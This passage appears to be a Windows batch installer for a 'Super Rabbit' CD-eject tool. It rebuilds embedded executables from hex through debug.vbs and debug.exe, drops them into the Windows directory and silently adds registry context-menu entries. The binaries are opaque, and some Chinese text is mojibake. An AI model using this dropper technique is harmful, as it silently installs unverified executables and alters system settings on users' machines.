@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000083CFB345B8CB00000000030003000000580000800E0000004000008010000000280000800000000083CFB345B8CB00000000010001000000800000800000000083CFB345B8CB00000000010001000000980000800000000083CFB345B8CB00000000030031750000E000008032750000C800008033750000B0000080"_>>debug.vbs
@echo +"0000000083CFB345B8CB00000000010004080000F80000000000000083CFB345B8CB00000000010000000000080100000000000083CFB345B8CB00000000010000000000180100000000000083CFB345B8CB00000000010000000000280100000000000083CFB345B8CB0000000001000000000038010000504100002C020000"_>>debug.vbs
@echo +"B0040000000000007C43000030000000B004000000000000AC43000028010000B004000000000000D4440000E8020000B004000000000000BC47000030010000B00400000000000000000000000000002C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100"_>>debug.vbs
@echo +"0000010000000000000001000000000000000000000000000400000001000000000000000000000000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B0048C010000010053007400720069006E00"_>>debug.vbs
@echo +"6700460069006C00650049006E0066006F0000006801000001003000380030003400300034004200300000002C000A00010043006F006D00700061006E0079004E0061006D006500000000007351ED954951719A0000000030000C0001004C006500670061006C0043006F00700079007200690067006800740000000F5CD191"_>>debug.vbs
@echo +"E55D5C4FA45B0000280008000100500072006F0064007500630074004E0061006D00650000000000E55D0B7A310000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300030000000000030000A000100500072006F006400750063007400560065007200730069006F006E000000"_>>debug.vbs
@echo +"31002E00300030000000000030001000010049006E007400650072006E0061006C004E0061006D006500000063006C006F00730065006300640000004000180001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006C006F0073006500630064002E00650078006500000000000100"_>>debug.vbs
@echo +"030020200200010001003001000031752020100001000400E8020000327510101000010004002801000033752800000010000000200000000100040000000000C0000000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF0000"_>>debug.vbs
@echo +"00FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000008F07700000008FFFFF07770000FFFFFFFF07000000FFFFFFFF00000000FFFFFFFF00000000FFFFF80000000000F80000EE0000000000EEEE0000000000EE00000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000FFFF0000FFFF0000FF8F0000F8030000C0010000C0070000C00F0000C00F0000C00F0000C00F0000C00F0000C07F0000C7FF0000FFFF0000FFFF0000FFFF00002800000020000000400000000100040000000000800200000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000008FFF0770000000000000000000008FFFFFFF07777000000000000008FFFFFFFFFFFF0777777000000000FFFFFFFFFFFFFFFF0777700000000000FFFFFFFFFFFFFFFF0770000000000000FFFFFFFFFFFFFFFF0000000000000000FF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFF88880000000000000000FFFFFFFF888800000000000000000000FF"_>>debug.vbs
@echo +"FF88880000EEEE000000000000000088880000EEEE000000000000000000000000EEEE000000000000000000000000EEEE00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFF80001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FF"_>>debug.vbs
@echo +"F80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2800000020000000400000000100010000000000000100000000000000000000000000000000000000000000FFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC3C7FFFC3FC1FF83FFC07FBFFFC1FFBFFFC7FFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFC1FFFBFC3DFFFBC3C1FFF83C3FFFFBC3FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC007FFFC0001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"5000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "closecd.exe"&del debug.vbs
md %windir%\winzheng\
copy closecd.exe %windir%\winzheng\
del closecd.exe
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject]>>SHOWALL.reg
ECHO @="�رչ���">>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,63,00,6c,00,6f,00,73,00,\>>SHOWALL.reg
ECHO   65,00,63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\Super Rabbit CDROM Eject]>>SHOWALL.reg
ECHO @="�رչ���">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\Super Rabbit CDROM Eject\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,63,00,6c,00,6f,00,73,00,\>>SHOWALL.reg
ECHO   65,00,63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg

exit
goto 9
rem �������������������������������
goto 9
:list1_1a
MODE con: COLS=50 LINES=15
cls
del /S /q %windir%\system32\srcd.dll
del /s /q %windir%\winzheng\closecd.exe

reg delete "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\Super Rabbit CDROM Eject" /f
reg delete "HKLM\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject" /f
reg delete "HKCR\Folder\shell\Super Rabbit CDROM Eject" /f
cls
echo.
echo                 �رչ���ɾ���ɹ�!
echo.
echo                   �����������!
pause>nul
goto list9_9
rem �������������������������������
goto 9
:list1_2
MODE con: COLS=50 LINES=15
cls
echo.���������У����Ժ�...
@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C01030031CFB3450000000000000000E0000F010B010600002000000020000000000000B811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
@echo +"04000000000000000050000000100000991F0100020000000000100000100000000010000010000000000000100000000000000000000000641D00002800000000400000EC0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000280200002000000000100000A80000000000000000000000000000000000000000000000000000002E74657874000000B8100000001000000020000000100000000000000000000000000000200000602E64617461000000F8090000003000000010000000300000000000000000000000000000400000C0"_>>debug.vbs
@echo +"2E72737263000000EC08000000400000001000000040000000000000000000000000000040000040FC4521411000000000000000000000004D535642564D36302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"44594773FCB148738D6948736E9849739E104973B0DB3B734E624873D568487324734673026248739A6248739A63487364B34873AF443B736FD83A73E6BB497378B73A738A69487385E33B7309B448737C6746735B4E3B731D6648734E6348737F9D4973A1B24873CE624873CE634873B0483B73026348733D5D48733EDE3973"_>>debug.vbs
@echo +"7795477336B83A733C14497336B148735E473B73EA204873BAB44873350F4873FE473B730000000007000800F91C4000211D4000001D40000000000000000000FF2534104000FF2554104000FF2560104000FF2528104000FF2524104000FF2568104000FF2518104000FF2578104000FF252C104000FF2574104000FF256C10"_>>debug.vbs
@echo +"4000FF255C104000FF2544104000FF2558104000FF251C104000FF2508104000FF258C104000FF2504104000FF259C104000FF2564104000FF2530104000FF254C104000FF2598104000FF2594104000FF2540104000FF2510104000FF2514104000FF2570104000FF2500104000FF2590104000FF253C104000FF25A0104000"_>>debug.vbs
@echo +"FF2588104000FF2520104000FF2584104000FF2580104000FF250C104000FF2550104000FF2538104000FF2548104000FF257C10400000006810134000E8EEFFFFFF000000000000300000003800000000000000EC060E97DE660C49AC384C759230097500000000000001000000000000000000D7D3B3CCD0F2000000000000"_>>debug.vbs
@echo +"FFCC3100006DF84A00F2A1C248AE9BCF42A7F2CA71EED617FD144EBE4FB644EBA57E7535E13A4FAD339966CF11B70C00AA0060D393000000000000000000000000000000000000000000000000000000000000000000000000540000004F000000000500466F726D31000D010500466F726D310003050000800A011901004200"_>>debug.vbs
@echo +"220123FFFFFFFF240500466F726D31002600270028002E003580340000092400003A0200001E0000004100FF04000000070000001C19400007000000C4184000500000006DF84A00F2A1C248AE9BCF42A7F2CA710000000000000000000000000000000000000000100000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"AD00000000000000001240004C00000056423521F01F7662366368732E646C6C000000002A000000000000000000000000000A00040800000000000000000000F814400000F0300000FFFFFF080000000100000001000000E9000000C0124000B0124000C4114000780000007F00000085000000860000000000000000000000"_>>debug.vbs
@echo +"00000000000000006F70656E636400B9A4B3CC310000D7D3B3CCD0F200000000010000003417400000000000681B4000FFFFFFFF00000000881740000830400002000000181440000000000000000000000000001814400001000000E41740000000000020144000010000002814400000000000241440000100000028144000"_>>debug.vbs
@echo +"0100B70168006C0050144000F032400000000000B4E81F00203D203120746865F41740000418400040001F003400000014184000FFFFFFFF000000000000000054144000802D220024184000FFFFFFFFF01440000000000028144000A01340009E114000A4114000AA1140000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00000000E8144000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000816C240433000000E9CB060000000000F401000034174000"_>>debug.vbs
@echo +"00000000B01B4000601D4000F009000008304000C6104000003040002A005C0041004B003A005C0058005000F3532E956962555CBE8B6E7F0759FD4E5C00505B0B7A8F5E5C00505B0B7A8F5E2E007600620070000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B012400002000000000000002C304000341B4000FFFFFFFF000000001C3040000D7FDA3AD8B39947803A47463808E17C0A0001000100010088174000000000000000000000000000CC1740000904000004080000"_>>debug.vbs
@echo +"0000000002000000A0134000FFFFFFFF50194000000000000000000000000000C417400003000000B8174000FFFF000083800100000000000000000000000000B9010000466F726D31000000D7D3B3CCD0F20000EED617FD144EBE4FB644EBA57E7535E1DBAB7E2716356542BAB9F952709BE76F6DF84A00F2A1C248AE9BCF42"_>>debug.vbs
@echo +"A7F2CA71DAD8229A01692642A817906942F966423A4FAD339966CF11B70C00AA0060D393466F726D000000002E3DFBFCFAA06810A73808002B3371B5433A5C50726F6772616D2046696C65735C4D6963726F736F66742056697375616C2053747564696F5C564239385C5642362E4F4C42000000564200002C18400000000000"_>>debug.vbs
@echo +"06000000090000003C18400074184000D03240000000000000000000E03B1B000D00000061647661706933322E646C6C000000000C0000005265674F70656E4B65794100A4184000B818400000000400D43240000000000000000000A1DC3240000BC07402FFE068C4184000B850114000FFD0FFE00000000A00000077696E6D"_>>debug.vbs
@echo +"6D2E646C6C0000000F0000006D636953656E64537472696E67410000FC1840000C19400000000400E03240000000000000000000A1E83240000BC07402FFE0681C194000B850114000FFD0FFE00000000C0040000000000000000000980000002A005C007300680065006C006C00650078005C0043006F006E00740065007800"_>>debug.vbs
@echo +"74004D0065006E007500480061006E0064006C006500720073005C007B00300030003000300030003000300030002D006B0069006E0067002D006B0069006E0067002D0032003200300030002D003000300030003000300030003000300030003000300030007D005C0046006F006C006400650072005C00000000002A000000"_>>debug.vbs
@echo +"73006500740020004300440041007500640069006F00200064006F006F00720020006F00700065006E000000564241362E444C4C000000005F5F76626146726565566172000000005F5F766261456E64000000005F5F766261467265655374724C697374000000005F5F766261537472546F416E736900005F5F766261537472"_>>debug.vbs
@echo +"493200005F5F7662615374724D6F7665000000005F5F76626156617254737445710000005F5F76626146726565537472000000005F5F766261566172436F7079000000005F5F76626153657453797374656D4572726F72005F5F766261493456617200005F5F7662615661724D6F766500000000681B40000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034174000FFFFFFFF00000000F41A4000000000000000000000000000FFFFFFFF000000007818400014184000EC32400000000000A0134000FFFFFFFF000000000C00000000000000"_>>debug.vbs
@echo +"F81A400000000000041B4000F41A4000F41A40000000000000000000000000004000000004000000CCCCCCCCCCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC558BEC83EC0C68C610400064A100000000506489250000000083EC6C5356578965F4C745F8A81040008B45088BC883E101894DFC24FE508945088B10FF52048D"_>>debug.vbs
@echo +"45CC33F6508975DC8975CC8975C88975C48975C08975B08975A089759089758CFF15801040008B3D841040008D4D8C518D55C868601940005289458CFFD7506800000080E893FCFFFF8BD8FF15201040008B458C8D55A08D4DCC8945A8C745A003000000FF15881040008D55908D4DDC895D98C7459003000000FF150C104000"_>>debug.vbs
@echo +"8D4DC8FF15A01040008D4DDC8D55A051528975A8C745A002800000FF153C1040006685C0744A565656FF15001040008BD08D4DC4FF1590104000508D45C050FFD7508D4DC868001A400051FFD750E861FCFFFFFF15201040008D55C08D45C4528D4DC850516A03FF157010400083C410FF15141040008975FC68321D4000EB21"_>>debug.vbs
@echo +"8D55C08D45C4528D4DC850516A03FF157010400083C4108D4DB0FF1510104000C38B35101040008D4DDCFFD68D4DCCFFD6C38B4508508B10FF52088B45FC8B4DEC5F5E64890D000000005B8BE55DC204009090909090909090909090909090909E9E9E9E8C1D0000FFFFFFFFFFFFFFFF341E0000001000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000421E0000501E00005A1E0000681E0000781E0000881E0000941E0000A41E0000B21E0000C81E0000D81E0000EA1E0000FC1E0000061F0000141F0000281F0000381F00004A1F0000581F00006E1F0000781F0000941F0000AA1F0000B81F0000CA1F0000DE1F0000E81F0000FA1F00000C200000"_>>debug.vbs
@echo +"202000003220000064000080402000004E20000060200000702000007A2000008A200000942000009E200000A8200000000000004D535642564D36302E444C4C000000005F5F7662615374724932000000005F4349636F73000000005F61646A5F667074616E000000005F5F7662615661724D6F7665000000005F5F76626146"_>>debug.vbs
@echo +"726565566172000000005F5F766261456E64000000005F61646A5F666469765F6D36340000005F61646A5F667072656D310000005F5F76626153657453797374656D4572726F720000005F61646A5F666469765F6D33320000005F61646A5F666469765F6D313669000000005F61646A5F66646976725F6D3136690000005F43"_>>debug.vbs
@echo +"4973696E000000005F5F76626143686B73746B0000004556454E545F53494E4B5F4164645265660000005F5F7662615661725473744571000000446C6C46756E6374696F6E43616C6C0000005F61646A5F66706174616E0000004556454E545F53494E4B5F52656C65617365000000005F4349737172740000004556454E545F"_>>debug.vbs
@echo +"53494E4B5F5175657279496E746572666163650000005F5F76626145786365707448616E646C6572000000005F61646A5F667072656D000000005F61646A5F66646976725F6D3634000000005F5F7662614650457863657074696F6E000000005F43496C6F67000000005F61646A5F666469765F6D333269000000005F61646A"_>>debug.vbs
